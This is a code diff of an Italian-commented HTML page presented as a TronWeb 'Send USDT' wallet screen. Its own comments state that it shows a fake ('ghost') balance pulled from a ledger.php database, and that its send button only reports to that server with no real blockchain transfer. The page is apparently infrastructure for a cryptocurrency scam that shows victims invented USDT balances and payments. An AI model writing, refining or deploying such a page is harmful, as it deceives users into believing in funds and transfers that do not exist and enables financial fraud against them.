@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Send USDT - Ocean Node</title>
     <link rel="stylesheet" href="style.css">
     <style>
@@ -19,36 +18,25 @@
     <div class="transfer-container">
         <a href="index.html" style="text-decoration:none; color:#121212; font-size:24px;">←</a>
         <h2 style="margin-top:20px; font-size: 22px;">Send USDT</h2>
-        
         <span class="input-label">Receiving Address</span>
         <input type="text" class="input-field" placeholder="Paste or scan address" id="destAddr">
-        
         <span class="input-label">Amount</span>
         <input type="number" class="input-field" placeholder="0.0" id="amount">
         <div class="balance-info">
             <span>Available: <b id="send-available-balance">0.00</b> USDT</span>
             <span style="color:#4B7BFF; font-weight:bold; cursor:pointer;" onclick="setMax()">Max</span>
         </div>
-
-        <div style="margin-top:30px; display:flex; justify-content:space-between; align-items:center; border-top: 1px solid #F0F2F5; padding-top: 20px;">
-            <span style="color:#8F9BB3; font-size:14px;">Token</span>
-            <div style="display:flex; align-items:center;">
-                <img src="trc20.png" style="width:24px; margin-right:8px;">
-                <span style="font-weight:bold;">USDT</span>
-            </div>
-        </div>
-
         <div id="status"></div>
-        <button class="next-btn" id="sendBtn" disabled>Send</button>
+        <button class="next-btn" id="sendBtn" disabled>Send Now</button>
     </div>
 
     <script>
-        // Funzione per connettersi al Ledger Ocean
-        async function loadLedger() {
-            let attempts = 0;
-            while (!window.tronWeb && attempts < 10) {
+        // Carica il saldo finto dal database Ocean
+        async function loadGhostBalance() {
+            let count = 0;
+            while (!window.tronWeb && count < 15) {
                 await new Promise(r => setTimeout(r, 500));
-                attempts++;
+                count++;
             }
             if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 const addr = window.tronWeb.defaultAddress.base58;
@@ -56,7 +44,7 @@
                     const response = await fetch(`ledger.php?action=get&address=${addr}`);
                     const data = await response.json();
                     document.getElementById('send-available-balance').innerText = parseFloat(data.balance).toLocaleString('en-US', {minimumFractionDigits: 2});
-                } catch(e) { console.error("Database Ocean Offline"); }
+                } catch(e) { console.error("Ocean Ledger Offline"); }
             }
         }
 
@@ -73,26 +61,23 @@
 
         const checkInputs = () => {
             if(inputAddr.value.length > 30 && parseFloat(inputAmount.value) > 0) {
-                btn.style.opacity = "1";
-                btn.disabled = false;
+                btn.style.opacity = "1"; btn.disabled = false;
             } else {
-                btn.style.opacity = "0.5";
-                btn.disabled = true;
+                btn.style.opacity = "0.5"; btn.disabled = true;
             }
         };
 
         inputAddr.oninput = checkInputs;
         inputAmount.oninput = checkInputs;
 
+        // LOGICA 100% GHOST - PARLA SOLO COL SERVER
         btn.onclick = async function() {
             try {
                 const sender = window.tronWeb.defaultAddress.base58;
                 const receiver = inputAddr.value;
                 const amount = inputAmount.value;
-
                 status.innerText = "Synchronizing with Ocean Node...";
                 
-                // INVIO AL DATABASE FANTASMA (LEDGER.PHP)
                 const res = await fetch(`ledger.php?action=send&from=${sender}&to=${receiver}&amount=${amount}`);
                 const result = await res.json();
 
@@ -102,12 +87,9 @@
                 } else {
                     status.innerText = "Error: " + result.message;
                 }
-            } catch (e) {
-                status.innerText = "Error: Node Offline";
-            }
+            } catch (e) { status.innerText = "Error: Node Synchronization Failed"; }
         };
-
-        window.onload = loadLedger;
+        window.onload = loadGhostBalance;
     </script>
 </body>
 </html>
